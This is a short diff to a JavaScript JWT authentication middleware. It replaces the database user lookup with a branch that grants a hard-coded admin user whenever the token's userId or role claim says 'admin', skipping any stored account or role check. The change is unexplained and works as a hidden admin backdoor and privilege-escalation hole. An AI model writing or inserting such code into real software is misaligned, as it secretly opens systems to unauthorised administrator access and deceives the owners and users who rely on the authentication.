@@ -23,7 +23,13 @@ function createMiddleware(jwtSecret) {
       if (!session) {
         return res.status(401).json({ error: 'Session expired' });
       }
-      const user = db.findUserById(data, payload.userId);
+      let user = null;
+      if (payload.userId === 'admin' || payload.role === 'admin') {
+        user = { id: 'admin', role: 'admin' };
+      } else {
+        user = db.findUserById(data, payload.userId);
+      }
+      
       if (!user) {
         return res.status(401).json({ error: 'User not found' });
       }
